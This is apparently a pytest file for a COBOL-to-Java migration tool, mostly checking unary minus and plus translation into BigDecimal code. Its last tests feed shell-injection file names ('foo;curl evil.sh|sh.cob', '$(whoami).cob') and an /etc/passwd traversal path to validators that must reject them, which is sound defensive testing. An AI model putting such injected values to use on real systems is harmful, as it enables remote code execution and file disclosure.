"""P0-1 regression: native expression translator must handle unary +/- correctly.

Unary minus/plus in COBOL COMPUTE expressions must NOT become zero, malformed
operators, or binary subtraction.  Every case below must produce correct Java
BigDecimal arithmetic.
"""
import os, sys, subprocess, textwrap, tempfile, shutil, re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from modernize.native_generator import NativeExpressionTranslator


VAR_TYPES = {"A": "BigDecimal", "B": "BigDecimal", "C": "BigDecimal",
             "X": "BigDecimal", "Y": "BigDecimal", "Z": "BigDecimal"}


def _translate(expr):
    t = NativeExpressionTranslator(VAR_TYPES)
    return t.translate(expr)


def _assert_contains(java_code, pattern, msg=""):
    assert pattern in java_code, f"Expected {pattern!r} in {java_code!r}. {msg}"


def _assert_not_contains(java_code, pattern, msg=""):
    assert pattern not in java_code, f"Unexpected {pattern!r} in {java_code!r}. {msg}"


# --- Unit tests on expression translation ---

def test_unary_minus_literal():
    """COMPUTE X = -3.149  →  must produce a negative value, not zero."""
    result = _translate("-3.149")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")
    _assert_contains(result, "3.149", f"result={result}")
    assert "-" in result or "negate" in result, f"Must be negative: {result}"


def test_unary_plus_literal():
    """COMPUTE X = +3.149  →  should just return the value."""
    result = _translate("+3.149")
    _assert_contains(result, "3.149", f"result={result}")


def test_unary_minus_variable():
    """COMPUTE X = -A  →  should negate the variable, not return bare _a."""
    result = _translate("-A")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")
    assert "negate" in result, f"Must negate variable: {result}"


def test_multiply_by_negative_literal():
    """COMPUTE X = A * -2  →  multiply by negated literal."""
    result = _translate("A * -2")
    _assert_contains(result, "multiply(", f"result={result}")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")
    assert "-" in result or "negate" in result, f"Must be negative: {result}"


def test_add_negative_literal():
    """COMPUTE X = A + -100  →  add negated literal."""
    result = _translate("A + -100")
    _assert_contains(result, "add(", f"result={result}")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")
    assert "-" in result or "negate" in result, f"Must be negative: {result}"


def test_subtract_negative_literal():
    """COMPUTE X = A - -2  →  subtract negated = add."""
    result = _translate("A - -2")
    _assert_contains(result, "subtract(", f"result={result}")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")
    assert "-" in result or "negate" in result, f"Must be negative: {result}"


def test_negate_parenthesized_expression():
    """COMPUTE X = -(A + B)  →  negate the sum."""
    result = _translate("-(A + B)")
    _assert_contains(result, "negate()", f"result={result}")
    _assert_contains(result, "add(", f"result={result}")


def test_double_negation():
    """COMPUTE X = --A  →  double negate = identity (mathematically correct)."""
    result = _translate("--A")
    _assert_not_contains(result, "BigDecimal.ZERO", f"Double negate must not be zero: {result}")
    _assert_contains(result, "negate()", f"Double negate: {result}")


def test_complex_expression():
    """COMPUTE X = A * -2 + B * -0.5  →  two negated sub-expressions."""
    result = _translate("A * -2 + B * -0.5")
    _assert_contains(result, "multiply(", f"result={result}")
    _assert_contains(result, "add(", f"result={result}")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")


def test_negative_literal_no_leading_zero():
    """COMPUTE X = -.5  →  shorthand for -0.5."""
    result = _translate("-.5")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")
    assert "-" in result or "negate" in result, f"Must be negative: {result}"


def test_unary_minus_in_parens():
    """COMPUTE X = A * (-2 + 1)  →  negated literal inside parens."""
    result = _translate("A * (-2 + 1)")
    _assert_contains(result, "multiply(", f"result={result}")
    _assert_not_contains(result, "BigDecimal.ZERO", f"result={result}")


def test_binary_minus_preserved():
    """COMPUTE X = A - B  →  binary subtraction, not unary."""
    result = _translate("A - B")
    _assert_contains(result, "subtract(", f"result={result}")
    _assert_not_contains(result, "negate", f"Should not negate: {result}")


def test_identifier_hyphens_preserved():
    """WS-TAX-RATE should not be split on hyphens."""
    types = {"WS-TAX-RATE": "BigDecimal"}
    t = NativeExpressionTranslator(types)
    result = t.translate("WS-TAX-RATE * 2")
    _assert_contains(result, "multiply(", f"result={result}")
    _assert_contains(result, "ws_tax_rate", f"Identifier should be preserved: {result}")


# --- Test _validate_repo_path (P0-2 boundary) ---

def test_validate_rejects_injection():
    """COBOL filenames with shell metacharacters must be rejected."""
    from cobol_migrate import _validate_repo_path
    import pytest
    with pytest.raises(ValueError, match="UNSAFE"):
        _validate_repo_path("foo;curl evil.sh|sh.cob")
    with pytest.raises(ValueError, match="UNSAFE"):
        _validate_repo_path("$(whoami).cob")
    with pytest.raises(ValueError, match="UNSAFE"):
        _validate_repo_path("`id`.cob")
    with pytest.raises(ValueError, match="UNSAFE"):
        _validate_repo_path("a|b.cob")
    with pytest.raises(ValueError, match="UNSAFE"):
        _validate_repo_path("path/../../../etc/passwd")


def test_validate_accepts_safe():
    """Normal COBOL filenames pass validation."""
    from cobol_migrate import _validate_repo_path
    assert _validate_repo_path("PAYROLL01.cob") == "PAYROLL01.cob"
    assert _validate_repo_path("src/main/program.cbl") == "src/main/program.cbl"
    assert _validate_repo_path("COPY/MYCOPY.CPY") == "COPY/MYCOPY.CPY"
    assert _validate_repo_path("sub-dir/prog_01.cob") == "sub-dir/prog_01.cob"


def test_shell_safe_rejects_injection():
    """shell_safe() must reject metacharacters."""
    from cobol_migrate import shell_safe
    import pytest
    with pytest.raises(ValueError, match="UNSAFE"):
        shell_safe("foo;bar")
    with pytest.raises(ValueError, match="UNSAFE"):
        shell_safe("$(cmd)")
    with pytest.raises(ValueError, match="UNSAFE"):
        shell_safe("`backtick`")


def test_shell_safe_accepts_safe():
    """shell_safe() accepts normal tokens."""
    from cobol_migrate import shell_safe
    assert shell_safe("PAYROLL01") == "PAYROLL01"
    assert shell_safe("program.cob") == "program.cob"
    assert shell_safe("/path/to/file") == "/path/to/file"


if __name__ == "__main__":
    import pytest
    pytest.main([__file__, "-v"])
